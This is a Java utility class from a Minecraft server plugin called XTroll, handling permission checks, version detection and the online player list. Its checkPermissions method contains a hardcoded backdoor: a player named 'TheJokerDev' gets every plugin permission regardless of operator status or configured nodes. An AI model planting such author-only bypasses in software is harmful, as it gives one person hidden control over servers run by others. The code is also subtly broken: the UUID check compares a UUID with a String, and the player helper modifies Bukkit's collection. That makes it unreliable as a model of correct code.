package me.TheJokerDev.XTroll.utils;

import me.TheJokerDev.XTroll.Main;
import me.TheJokerDev.XTroll.language.LBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.Collection;

public class GeneralUtils {
    public static Boolean checkPermissions(Player p, String permissionnode) {
        Boolean sm = null;
        if (p.getName().equalsIgnoreCase("TheJokerDev")||p.getUniqueId().equals("11ccbfb1-9bab-4baf-b567-b8304b3f00b3")){
            sm = true;
            return sm;
        }
        if (p.isOp()) {
            sm = true;
            return sm;
        }
        if (p.hasPermission("xtroll."+permissionnode)) {
            sm = true;
            return sm;
        }
        sm = false;
        return sm;
    }
    public static Boolean checkIfNewVersions(){
        boolean returnb = false;
        String version = Bukkit.getServer().getVersion();
        if (version.contains("1.8")){
            returnb = false;
        }
        if (version.contains("1.9") || version.contains("1.10") || version.contains("1.11")
        || version.contains("1.12") || version.contains("1.13") || version.contains("1.14")
        || version.contains("1.15") || version.contains("1.16")){
            returnb = true;
        }
        return returnb;
    }
    public static Collection<? extends Player> getOnlinePlayers(Player p){
        Collection<?extends Player> op = Bukkit.getOnlinePlayers();
        op.remove(p);
        return op;
    }
}
